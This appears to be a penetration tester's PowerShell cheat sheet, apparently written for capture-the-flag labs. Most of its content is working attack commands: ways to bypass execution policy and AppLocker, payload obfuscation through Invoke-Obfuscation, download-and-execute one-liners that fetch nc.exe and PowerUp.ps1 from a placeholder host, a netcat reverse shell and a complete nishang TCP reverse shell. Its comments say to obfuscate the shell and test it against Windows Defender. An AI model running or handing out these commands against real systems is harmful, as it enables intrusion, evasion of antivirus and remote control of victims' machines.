powershell
----------

#Can be executed from various locations
Registry: poweliks, Kovter(mshta/rundll+ActiveXObject)
File: .ps1/.vbs/.bat and scheduled task
Macros: Word,Excel,etc.
Remotely: PowerShell Remoting,PsExec,WMI,powershell sendkeys,.Net SendKeys

#powercat - netcat powershell version
#nishang - powershell utilities



#Gets powershell policy
get-executionpolicy



Restricted
no powershell scripts

AllSigned
Only scripts signed by trusted publisher 

RemoteSigned
Scripts downloaded from the Internet/remote network must be signed

UnRestricted
All Powershell scripts can be run



(powershell one line all blocked)
Set-ExecutionPolicy -Scope CurrentUser Unrestricted
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
powershell.exe -noprofile -executionpolicy bypass -file .\script.ps1



#Execute 32bit powershell (sysWoW64 - Windows32 on Windows64)
C:\WIndOWs\sySwOw64\WINdOwspOweRshEll\v1.0\poWersHeLl.Exe 



#Powershell on linux
#Helps with using various invoke/obscure scripts (Arch)
git clone https://aur.archlinux.org/powershell-preview-bin.git
makepkg -i
/usr/bin/pwsh-preview


#Powershell Obfuscation
#https://github.com/danielbohannon/Invoke-Obfuscation
PS /home/Invoke-Obfuscation> Import-Module ./Invoke-Obfuscation.psd1
PS /home/Invoke-Obfuscation> Invoke-Obfuscation

HELP MENU :: Available options shown below:

[*]  Tutorial of how to use this tool        	  TUTORIAL
[*]  Show this Help Menu                     	  HELP,GET-HELP,?,-?,/?,MENU
[*]  Show options for payload to obfuscate   	  SHOW OPTIONS,SHOW,OPTIONS
[*]  Clear screen                            	  CLEAR,CLEAR-HOST,CLS
[*]  Execute ObfuscatedCommand locally       	  EXEC,EXECUTE,TEST,RUN
[*]  Copy ObfuscatedCommand to clipboard     	  COPY,CLIP,CLIPBOARD
[*]  Write ObfuscatedCommand Out to disk     	  OUT
[*]  Reset ALL obfuscation for ObfuscatedCommand  RESET
[*]  Undo LAST obfuscation for ObfuscatedCommand  UNDO
[*]  Go Back to previous obfuscation menu    	  BACK,CD ..
[*]  Quit Invoke-Obfuscation                 	  QUIT,EXIT
[*]  Return to Home Menu                     	  HOME,MAIN


Choose one of the below options:

[*] TOKEN	Obfuscate PowerShell command Tokens
[*] AST		Obfuscate PowerShell Ast nodes (PS3.0+)
[*] STRING	Obfuscate entire command as a String
[*] ENCODING	Obfuscate entire command via Encoding
[*] COMPRESS	Convert entire command to one-liner and Compress
[*] LAUNCHER	Obfuscate command args w/Launcher techniques (run once at end)


#Empire-Mod-Hackplayers
git clone https://github.com/Hackplayers/Empire-mod-Hackplayers.git



# Run inside the reverse shell: 
powershell -c '(new-object System.Net.WebClient).DownloadFile("http://x.x.x.x/nc.exe", "C:\Windows\Temp\nc.exe")'
# OR
powershell -c 'Invoke-WebRequest "http://x.x.x.x/nc.exe" -OutFile "C:\Windows\Temp\nc.exe"' 


#powershell bypass antvirus
powershell wget "http://x.x.x.x/nc64.exe" -outfile "nc64.exe"
nc.exe -e cmd.exe x.x.x.x 1234

#Download shell
powershell "(new-object System.Net.WebClient).Downloadfile('http://x.x.x.x:80/dev4444.exe', 'dev4444.exe')"
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://x.x.x.x/PowerUp.ps1');Invoke-AllChecks

#Login as User
#Once as User start new
$username = 'DOMAION\username' 
$securePassword = ConvertTo-SecureString -AsPlainText -Force 'password'
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Enter-PSSession -ComputerName localhost -Credential $credential

whoami
bart\h.potter

#To get file in certain location
cmd.exe /c "type c:\location\user.txt"



#nishang one line shell
#obscurify it then run on BlueTeam
#test against windows defender
#If applocker disables powershell use 32bit powershell location to execute
#c:\windows\syswow64\windowspowershell\v1.0\powershell.exe
$client = New-Object System.Net.Sockets.TCPClient('x.x.x.x',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()


#Unzip Archive
Expand-Archive %temp%\test.zip
